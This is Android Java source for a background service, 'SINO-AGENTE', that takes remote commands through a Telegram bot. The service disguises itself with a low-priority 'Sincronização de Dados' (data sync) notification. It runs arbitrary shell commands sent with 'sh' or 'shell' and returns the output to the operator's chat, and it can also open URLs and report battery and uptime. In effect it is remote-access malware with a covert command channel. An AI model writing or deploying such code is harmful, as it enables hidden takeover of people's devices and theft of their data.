package br.svc.relay;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;

import java.util.Locale;

/**
 * SINO-AGENTE v2.0 — comando remoto via TELEGRAM (transporte provado do SINO-GPS).
 * Zero WebSocket. Zero Cloudflare. O chat com o bot e o console.
 */
public class RelayService extends Service {

    private static final String CH = "sync_data_min";
    private static final int NOTIF_ID = 2002;

    private TelegramBridge tg;
    private volatile boolean running = true;
    private long startedAt = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        startedAt = System.currentTimeMillis();
        goForeground();

        tg = new TelegramBridge(BuildConfig.BOT_TOKEN, BuildConfig.MASTER_CHAT);
        tg.say("agente online v" + BuildConfig.VERSION_NAME);

        new Thread(() -> tg.listen((text, from) ->
                new Thread(() -> onCmd(text), "relay-exec").start()), "relay-tg").start();
    }

    private void onCmd(String text) {
        String c = text.trim();
        String low = c.toLowerCase(Locale.ROOT);
        if (low.equals("ping")) { tg.say("pong"); return; }
        if (low.equals("status") || low.equals("estado")) { tg.say(statusLine()); return; }
        if (low.startsWith("open ")) {
            try {
                Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(c.substring(5).trim()));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                tg.say("abrindo: " + c.substring(5).trim());
            } catch (Exception e) { tg.say("erro open: " + e); }
            return;
        }
        if (low.startsWith("sh ")) { tg.say(Exec.run(c.substring(3))); return; }
        if (low.startsWith("shell ")) { tg.say(Exec.run(c.substring(6))); return; }
        tg.say("comandos: sh <cmd> | shell <cmd> | open <url> | status | ping");
    }

    private String statusLine() {
        IntentFilter f = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent bi;
        if (Build.VERSION.SDK_INT >= 33)
            bi = registerReceiver(null, f, Context.RECEIVER_NOT_EXPORTED);
        else
            bi = registerReceiver(null, f);
        int bat = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
        long upMin = (System.currentTimeMillis() - startedAt) / 60_000L;
        return String.format(Locale.US, "bateria %d%% · uptime %dmin · transporte telegram · posto %s",
                bat, upMin, BuildConfig.VERSION_NAME);
    }

    private void goForeground() {
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            nm.createNotificationChannel(new NotificationChannel(CH, "sincronizacao de dados",
                    NotificationManager.IMPORTANCE_MIN));
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, CH)
                : new Notification.Builder(this);
        b.setContentTitle("Sincronização de Dados")
         .setContentText("Sincronizando…")
         .setSmallIcon(android.R.drawable.stat_notify_sync)
         .setOngoing(false).setShowWhen(false);
        if (Build.VERSION.SDK_INT >= 31) b.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_IMMEDIATE);
        startForeground(NOTIF_ID, b.build());
    }

    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        running = false;
        if (tg != null) tg.stop();
        super.onDestroy();
    }
}
